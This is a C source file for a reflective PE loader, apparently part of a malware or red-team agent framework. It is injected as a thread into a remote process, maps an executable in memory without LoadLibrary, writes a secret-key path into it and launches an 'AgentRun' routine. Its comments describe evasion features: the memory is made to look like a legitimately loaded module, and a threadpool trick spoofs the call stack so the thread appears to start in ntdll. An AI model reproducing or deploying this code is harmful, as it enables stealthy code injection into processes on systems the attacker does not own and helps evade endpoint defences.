/*
 * client/loader.c — Position-Independent Reflective PE Loader
 * =============================================================
 * This file compiles to a single function `rfl_loader` that is extracted
 * as raw x64 machine code and embedded in inject.c as `s_rfl_loader[]`.
 *
 * The loader is injected into a remote process as a thread function.
 * It receives one argument: a pointer to an `RflData` block (see loader.h)
 * that contains:
 *   - The raw PE file bytes (read from disk before injection)
 *   - The RVA of AgentRun inside the PE
 *   - All Win32 API function pointers needed for loading
 *   - The absolute path to secret.key (copied into g_key_path)
 *
 * What it does (no LoadLibraryA on the EXE — no CRT init crash):
 *   1. VirtualAlloc SizeOfImage bytes in the current process
 *   2. Copy PE headers
 *   3. Copy each section
 *   4. Apply base relocations
 *   5. Resolve IAT: for each import descriptor, LoadLibraryA(dllName),
 *      then GetProcAddress for each thunk
 *   6. Write g_key_path into the mapped image at the provided offset
 *   7. Create a new thread at (base + agentRunRva)
 *
 * Build: compiled with -fpic -O0 -fno-stack-protector by tools/build_blob.py
 *        or by the Makefile.  rfl_loader and rfl_loader_end are placed in
 *        a dedicated COMDAT section ".text$rfl_loader" via the section
 *        attribute below.  objcopy extracts ONLY that section, so the binary
 *        is exactly the bytes between the function prologue and the sentinel.
 *
 * Portability:
 *   - The attribute is GCC/Clang-only.  loader.c is NEVER compiled with MSVC.
 *   - LOADER_CC in the Makefile is always set to a GCC/MinGW binary.
 *   - The resulting blob is pure x64 machine code with no ABI dependencies.
 *     It works on any x64 Windows target regardless of which machine built it.
 *
 * Constraints:
 *   - NO external calls except through the function pointers in RflData.
 *   - NO global/static data (everything on the stack or via pData).
 *   - NO string literals in .rodata (write them inline on the stack).
 *   - All loops use local variables only.
 */

#include "loader.h"

/* Suppress all CRT dependencies */
#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#endif

/* ── Helpers (inlined, no CRT) ────────────────────────────────────────────── */

static __attribute__((always_inline)) inline int rfl_strncmp(const char *a, const char *b, int n)
{
    while (n-- > 0) {
        if (*a != *b) return (unsigned char)*a - (unsigned char)*b;
        if (!*a) return 0;
        a++; b++;
    }
    return 0;
}

static __attribute__((always_inline)) inline void rfl_memcpy(void *dst, const void *src, unsigned long n)
{
    unsigned char *d = (unsigned char *)dst;
    const unsigned char *s = (const unsigned char *)src;
    while (n--) *d++ = *s++;
}

static __attribute__((always_inline)) inline void rfl_memset(void *dst, int c, unsigned long n)
{
    unsigned char *d = (unsigned char *)dst;
    while (n--) *d++ = (unsigned char)c;
}

static __attribute__((always_inline)) inline unsigned long rfl_strlen(const char *s)
{
    const char *p = s;
    while (*p) p++;
    return (unsigned long)(p - s);
}

/* ── PE type helpers ─────────────────────────────────────────────────────── */

typedef unsigned char      u8;
typedef unsigned short     u16;
typedef unsigned int       u32;
typedef unsigned long long u64;

#pragma pack(push,1)
typedef struct { u16 e_magic; u8 pad[58]; u32 e_lfanew; } Dos;
typedef struct { u32 sig; u16 mach; u16 nsec; u32 ts; u32 symoff; u32 nsym; u16 optsz; u16 chars; } FileHdr;
typedef struct {
    u16 magic; u8 majl; u8 minl; u32 csz; u32 idsz; u32 unisz;
    u32 entry; u32 cbase;
    u64 imgbase; u32 secalign; u32 filealign;
    u16 osmaj; u16 osmin; u16 imgmaj; u16 imgmin; u16 smaj; u16 smin;
    u32 win32ver; u32 imgsz; u32 hdrsz; u32 cksum;
    u16 subsys; u16 dllchar; u64 stkres; u64 stkcom; u64 hpres; u64 hpcom;
    u32 ldrflags; u32 nrva;
    struct { u32 rva; u32 sz; } dd[16];
} Opt64;
typedef struct { u32 vaddr; u32 vsz; u32 rawoff; u32 rawsz; u32 reloff; u32 linoff; u16 nrel; u16 nlin; u32 chars; } Sec;
typedef struct { u32 origFirstThunk; u32 ts; u32 fwdchain; u32 nameRVA; u32 firstThunk; } ImpDesc;
typedef struct { u32 pageRVA; u32 blockSz; } RelocBlock;
#pragma pack(pop)

/* ── The loader function ──────────────────────────────────────────────────── */

/* Place rfl_loader and its sentinel in a dedicated named COMDAT section.
 * This makes the objcopy --only-section='.text$rfl_loader' extraction
 * reliable and independent of any other code in this translation unit. */
#define RFL_SECTION __attribute__((section(".text$rfl_loader"), noinline))

RFL_SECTION
DWORD WINAPI rfl_loader(RflData *pData)
{
    u8  *raw   = pData->pRawPE;
    u32  rawSz = pData->rawSize;

    /* ── 1. Parse PE headers ─────────────────────────────────────────── */
    /* Minimum DOS header size is 64 bytes (e_lfanew at offset 0x3C).    */
    if (rawSz < 64) return 1;
    Dos     *dos  = (Dos *)raw;
    u32      lfanew = dos->e_lfanew;
    /* PE signature + FileHeader + minimal OptionalHeader (2-byte magic) */
    if (lfanew + 4 + sizeof(FileHdr) + 2 > rawSz) return 1;
    u8      *nth  = raw + lfanew;
    FileHdr *fh   = (FileHdr *)(nth + 4);
    Opt64   *oh   = (Opt64  *)((u8 *)fh + sizeof(FileHdr));
    if (lfanew + 4 + sizeof(FileHdr) + fh->optsz > rawSz) return 1;
    Sec     *secs = (Sec    *)((u8 *)oh + fh->optsz);
    u32  nSec  = fh->nsec;
    u64  imgSz = oh->imgsz;
    u32  hdrSz = oh->hdrsz;
    /* Section array must also fit within the raw buffer */
    if ((u8 *)secs + nSec * sizeof(Sec) > raw + rawSz) return 1;
    if (hdrSz > rawSz) return 1;

    /* ── 2. Allocate memory for the mapped image (F-6: RW only, not RWX) ─
     * Allocate PAGE_READWRITE.  After sections are copied and IAT resolved
     * we set per-section permissions (RX/.text, RO/.rdata, RW/.data) via
     * pVirtualProtect.  No RWX page ever exists.                          */
    u8 *base = pData->pVirtualAlloc
              ? (u8 *)pData->pVirtualAlloc(NULL, (SIZE_T)imgSz,
                                            MEM_COMMIT | MEM_RESERVE,
                                            PAGE_READWRITE)
              : NULL;
    if (!base) return 2;

    /* ── 3. Copy headers ─────────────────────────────────────────────── */
    rfl_memcpy(base, raw, hdrSz);

    /* ── 4. Copy sections ────────────────────────────────────────────── */
    for (u32 i = 0; i < nSec; i++) {
        if (secs[i].rawsz == 0) continue;
        /* Bounds-check: source range must fit inside the raw buffer, and
         * destination range must fit inside the allocated image.        */
        if ((u64)secs[i].rawoff + secs[i].rawsz > rawSz) continue;
        if ((u64)secs[i].vaddr  + secs[i].rawsz > imgSz) continue;
        rfl_memcpy(base + secs[i].vaddr,
                   raw  + secs[i].rawoff,
                   secs[i].rawsz);
    }

    /* ── 5. Base relocations ─────────────────────────────────────────── */
    u32 relocRVA = oh->dd[5].rva;
    u32 relocSz  = oh->dd[5].sz;
    if (relocRVA && relocSz) {
        long long delta = (long long)(u64)base - (long long)oh->imgbase;
        u8 *p   = base + relocRVA;
        u8 *end = p + relocSz;
        while (p < end) {
            RelocBlock *blk = (RelocBlock *)p;
            if (blk->blockSz < 8) break;
            u16 *entries = (u16 *)(p + 8);
            u32   count  = (blk->blockSz - 8) / 2;
            for (u32 j = 0; j < count; j++) {
                u16 e    = entries[j];
                u16 type = e >> 12;
                u16 off  = e & 0xFFF;
                if (type == 10) { /* IMAGE_REL_BASED_DIR64 */
                    long long *fixup = (long long *)(base + blk->pageRVA + off);
                    *fixup += delta;
                }
            }
            p += blk->blockSz;
        }
    }

    /* ── 6. Resolve IAT ──────────────────────────────────────────────── */
    u32 impRVA = oh->dd[1].rva;
    if (impRVA) {
        ImpDesc *desc = (ImpDesc *)(base + impRVA);
        while (desc->nameRVA) {
            char *dllName = (char *)(base + desc->nameRVA);
            HMODULE hDll  = (HMODULE)pData->pLoadLibraryA(dllName);

            /* If the DLL couldn't be loaded skip its entire descriptor —
             * writing NULLs into every thunk would guarantee a crash the
             * moment any import from that DLL is called. */
            if (!hDll) { desc++; continue; }

            /* OrigFirstThunk = name table (read), FirstThunk = IAT (write).
             * Both must be non-zero; skip descriptor if either is missing. */
            if (!desc->firstThunk || !desc->origFirstThunk)
                { desc++; continue; }

            u64 *nameThunk = (u64 *)(base + desc->origFirstThunk);  /* read  */
            u64 *iatThunk  = (u64 *)(base + desc->firstThunk);       /* write */

            while (*nameThunk) {
                u64 t = *nameThunk;
                char *funcName;
                if (t & (1ULL << 63)) {
                    /* Import by ordinal */
                    funcName = (char *)(t & 0xFFFF);
                } else {
                    /* Import by name — skip 2-byte hint */
                    funcName = (char *)(base + (u32)t + 2);
                }
                u64 resolved = (u64)pData->pGetProcAddress(hDll, funcName);
                /* Only write the resolved address if non-NULL.  A NULL result
                 * means the export no longer exists (API removed / renamed).
                 * Leaving the thunk at its original PE value (the hint/name
                 * RVA) is wrong but at least produces an obvious AV fault
                 * rather than a silent null-deref at the call site.        */
                if (resolved)
                    *iatThunk = resolved;
                nameThunk++;
                iatThunk++;
            }
            desc++;
        }
    }

    /* ── 6b. Set per-section memory permissions (F-6) ───────────────────
     * Walk section headers again; flip each section to its correct
     * protection so the final mapping looks like a legitimately-loaded
     * module (MEM_PRIVATE but without any RWX region).
     *
     *   IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE  → PAGE_EXECUTE_READ
     *   IMAGE_SCN_CNT_INITIALIZED_DATA without exec  → PAGE_READONLY
     *     (if also writable → PAGE_READWRITE)
     *   All others (headers, .pdata, .rsrc, .reloc)  → PAGE_READONLY
     *
     * pVirtualProtect may be NULL on builds that do not supply it; skip
     * gracefully (mapping stays RW, which is suboptimal but not a crash).
     */
    if (pData->pVirtualProtect) {
        for (u32 si = 0; si < nSec; si++) {
            u32 vaddr2, vsz2, chars2;
            memcpy(&vaddr2, (u8 *)secs + si*sizeof(Sec) + 12, 4);
            memcpy(&vsz2,   (u8 *)secs + si*sizeof(Sec) +  8, 4);
            memcpy(&chars2, (u8 *)secs + si*sizeof(Sec) + 36, 4);
            if (!vaddr2 || !vsz2) continue;

            DWORD newProt;
            int isExec = (chars2 & 0x20) != 0;    /* IMAGE_SCN_CNT_CODE */
            int isWrite= (chars2 & 0x80000000u) != 0; /* IMAGE_SCN_MEM_WRITE */
            if (isExec)
                newProt = 0x20; /* PAGE_EXECUTE_READ */
            else if (isWrite)
                newProt = 0x04; /* PAGE_READWRITE */
            else
                newProt = 0x02; /* PAGE_READONLY */

            DWORD oldProt2 = 0;
            pData->pVirtualProtect(base + vaddr2, (SIZE_T)vsz2,
                                   newProt, &oldProt2);
        }
        /* Also protect the PE headers as read-only */
        DWORD oldHdr = 0;
        pData->pVirtualProtect(base, (SIZE_T)hdrSz, 0x02 /*PAGE_READONLY*/,
                               &oldHdr);
    }

    /* ── 7. Write key path into mapped image's g_key_path global ─────── */
    if (pData->gKeyPathOffset && pData->gKeyPathSize) {
        char *dest = (char *)(base + pData->gKeyPathOffset);
        const char *src = pData->keyPath;
        u32 n = pData->gKeyPathSize - 1;
        u32 i;
        for (i = 0; i < n && src[i]; i++) dest[i] = src[i];
        dest[i] = '\0';
    }

    /* ── 8. Flush instruction cache ──────────────────────────────────── */
    pData->pFlushInstructionCache((HANDLE)-1, base, (SIZE_T)imgSz);

    /* ── 9. Spawn AgentRun via threadpool (F-6 call-stack spoof) ────────
     * TpAllocWork / TpPostWork cause the spawned thread to begin execution
     * inside ntdll!TppWorkerThread, giving it a legitimate-looking call
     * stack rooted in ntdll rather than starting directly at AgentRun.
     *
     * Falls back to CreateThread if the threadpool pointers are absent or
     * TpAllocWork fails — correct execution is preserved at the cost of
     * a less-clean call stack.                                            */
    LPTHREAD_START_ROUTINE pfnAgent =
        (LPTHREAD_START_ROUTINE)(base + pData->agentRunRva);

    int tp_ok = 0;
    if (pData->pTpAllocWork && pData->pTpPostWork && pData->pTpReleaseWork) {
        PVOID work = pData->pTpAllocWork(
            (PVOID)(ULONG_PTR)pfnAgent, NULL, NULL);
        if (work) {
            pData->pTpPostWork(work);
            pData->pTpReleaseWork(work);
            tp_ok = 1;
        }
    }
    if (!tp_ok && pData->pCreateThread) {
        HANDLE hThread = pData->pCreateThread(NULL, 0, pfnAgent, NULL, 0, NULL);
        if (hThread) pData->pCloseHandle(hThread);
    }

    return 0;
}

/* Sentinel — also placed in the same section so the extracted binary ends
 * exactly at the byte boundary of the function, not at the end of .text. */
RFL_SECTION
void rfl_loader_end(void) {}
